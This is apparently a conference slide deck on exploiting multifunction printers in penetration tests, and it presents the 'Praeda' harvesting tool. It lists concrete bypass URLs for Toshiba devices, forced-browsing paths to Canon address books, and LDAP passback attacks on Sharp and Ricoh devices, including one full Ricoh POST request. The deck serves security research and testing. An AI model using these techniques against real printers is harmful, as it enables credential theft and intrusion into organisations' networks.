FROM PRINTER TO PWND
Leveraging Multifunction Printers During Penetration Testing

INTRODUCTION
 From Dayton Ohio region  Last 18 years in IT  10 year in security  3 of those as a security penetration tester  Member of foofus.net team  3rd time presenting at Defcon w00t!

AGENDA
 Multi function printer features  Multi function printer security  Attacking multi function printer devices  Leveraging these attacks during pentesting  Development of an automated harvesting tool  Conclusion & Question

MULTI FUNCTION PRINTER FEATURES

MULTI FUNCTION PRINTER FEATURES
 Scan to File
 Window file server access  FTP server access
 Scan to Email
 Email server SMTP access
 Email Notification
 Email server SMTP access

MULTI FUNCTION PRINTER FEATURES
 LDAP authentication services  User address books  System logging  Remote functionality  Backup/cloning

MULTI FUNCTION PRINTER SECURITY

MULTI FUNCTION PRINTER SECURITY
Four steps to security failure
 Roll it in and power it up
 Integrate with business systems
 Passwords
 No password set  Factory default setting
 No patch management

ATTACKING MULTI FUNCTION PRINTER
DEVICES

ATTACKING MULTI FUNCTION PRINTERS
 Why
 Gather information  Escalation rights into other core systems
 When
 If exposed to internet  Once you gain a foot hold into internal network

ATTACKING MULTI FUNCTION PRINTERS
 How
 Leveraging default password  Access bypass attacks  Information leakage attacks  Forceful browsing attacks  Backup/cloning functions  Passback attack

MFP SECURITY BYPASS ATTACK
 The ability to bypass authentication on a device by passing various forms of data in the URL
 Toshiba  HP

TOSHIBA BYPASS ATTACK
/TopAccess/Administrator/Setup/ScanToFile/List.htm Redirects to /TopAccess/Administrator/Login/Login.htm

TOSHIBA BYPASS ATTACK
/TopAccess//Administrator/Setup/ScanToFile/List.htm

HP OFFICEJET BYPASS ATTACK
DEMO

MFP INFORMATION LEAKAGE ATTACKS
 MFP devices exposing data unintentionally. Data of value can typically be extracted from web page source code.  Toshiba  Canon  HP  Sharp

TOSHIBA INFORMATION LEAKAGE ATTACK

TOSHIBA INFORMATION LEAKAGE ATTACK

HP INFORMATION LEAKAGE ATTACK

MFP FORCED BROWSING ATTACK
 Access to web pages and files are gained by just knowing the correct URL path
 Not uncommon to find that embedded devices such as printers correctly secure files with extensions of  cgi  htm  html
 But may allow access to other file types

CANON FORCED BROWSING
 Canon ImageRunners address books can be retrieved through forceful browsing
 Once a valid cookie is gained the address books can be retrieved without authenticating
 A valid cookie is gained by accessing the printers home page
 Fails on devices with a Product Name  ir3580  ir4080

CANON FORCED BROWSING
 Force browse to address books  abook.ldif  abook.abk  imagerunners have by default up to 11 address books
Increment up to gain access to all address books

CANON FORCED BROWSING

MFP PASSBACK ATTACK
 Passback attack
 An attack where the MFP device is tricked into communicating with the attacker, versus communicating with its standard configured services
 Number of printers have test functions for testing LDAP configuration setups
 May also be possible on other services

MFP PASSBACK ATTACK

LDAP Test Button

Attacker

Change LDAP server IP Setting
LDAP Test Button

Printer

LDAP auth to attacker

Auth to LDAP

LDAP Server

SHARP PASSBACK ATTACK
 Sharp MX series support these test functions for:  LDAP  SMTP
 Attacker can send all setting within HTTP(s) post request
 If password is left at ******* then stored password is used

SHARP PASSBACK ATTACK

SHARP PASSBACK ATTACK
 Post values of interest  Server IP Address  (ggt_textbox(21)  AUTH TYPE  ggt_select(25)  PORT Number  ggt_hidden(30)

SHARP PASSBACK ATTACK

RICOH PASSBACK ATTACK
 Similar issue at the Sharp printers
 Easily tricked in passing data back to the attacker

RICOH PASSBACK ATTACK

RICOH PASSBACK ATTACK
/web/entry/en/websys/ldapServer/ldapServerSetConfirmTest.cgi
paramControl=INPUT&urlLang=en&urlProfile=entry&urlScheme=HTTP&returnValue=SUC CESS&title=LDAP_SERVER&availability=nameonserverNameonsearchPointonportNumon sslonauthonuserNameonpasswordonkerberosonconnectTestonsearchNameonmailAddres sonfaxNumoncompanyNameonpostNameonoptionalSearchConditionon&authInfo=false&l dapServerNumSelectedOut=1&entryNameOut=ACMECD01&serverNameOut=10.80.105. 200&searchPointOut=DC%3Dacme&portNumOut=389&enableSSLOut=false&enableAut hOut=RADIO_NO_AUTHRADIO_PLAIN_AUTH_ONRADIO_DIGEST_AUTH_ONRADIO_KERBER OS_ONRADIO_PLAIN_AUTH_ON&userNameOut=LDAPAdmin&isRealmKeyNameOut=1111 1&realmNameOut=UA_NOT_LOGINUA_NOT_LOGINUA_NOT_LOGINUA_NOT_LOGINUA_NOT _LOGIN0&searchNameOut=cn&searchMlAddOut=mail&searchFaxNumOut=facsimileTele phoneNumber&searchCompanyNameOut=o&searchPostNameOut=ou&searchAttrOut=&s earchKeyOut=&entryName=ACMECD01&serverName=10.80.105.200&searchPoint=DC% 3Dacme&portNum=389&enableSSL=false&enableAuth=RADIO_PLAIN_AUTH_ON&userN ame=LDAPAdmin&searchName=cn&searchMlAdd=mail&searchFaxNum=facsimileTeleph oneNumber&searchCompanyName=o&searchPostName=ou&searchAttr=&searchKey=

MFP BACKUP/CLONING
 Extracted information from backup data
 A number of MFP devices provide a method to backup/clone system configuration
 This function prides a method to quickly deploy multiple devices throughout an organization without needing physical access to each devices

CANON BACKUP EXPORT
 Additional functions export
 Usermode.umd  http://MFP/usermode.umd  Usermode.umd is a data file but
does contain ascii

XEROX
DEMO

`PRAEDA' BUILDING AN AUTOMATED
HARVESTING TOOL

`PRAEDA' AUTOMATED HARVESTING TOOL
 PRAEDA latin for "plunder, spoils of war, booty"
 Tool designed to gather information from web interfaces on printers
 Present version written in Perl

`PRAEDA' AUTOMATED HARVESTING TOOL
 Present version
 16 modules  Extract data from 39 different printers models
 Canon  Xerox  Toshiba  Sharp  HP  Ricoh

`PRAEDA' AUTOMATED HARVESTING TOOL

`PRAEDA' AUTOMATED HARVESTING TOOL
Data file (DATA_LIST)
 1st field (P000032) = sequence number  2nd field (Top Page ­ MX-2600N) = Title page  3rd field (Rapid Logic/1.1) = Server type  4th field (MP0014) = Module to execute

`PRAEDA' AUTOMATED HARVESTING TOOL
DISPATCHER (PRAEDA.PL)  Syntax
"praeda.pl TARGET_FILE TCP_PORT PROJECT_NAME OUTPUT_FILE (-ssl)"
 Queries printers in target list  If a match is found in data_list module jobs
listed in 4th column are executed  Recovered data is stored in logs file or separate
extract files under project name

`PRAEDA' AUTOMATED HARVESTING TOOL
Praeda project moving forward
 Continue researching encryption methods used by some vendors for backup and clone process outputs
 HP  Xerox
 Working migrating code to Ruby ­ early stages of conversion started
 Will continue developing in Perl for the moment
 Looking for contributors for project
 Develop other network appliance modules besides printers ­ plan to release a half dozen or more modules next month

CONCLUSION & QUESTION
Deral Heiland percX@foofus.net dh@layereddefense.com
Praeda Beta version 0.01.2b available for download from
www.foofus.net

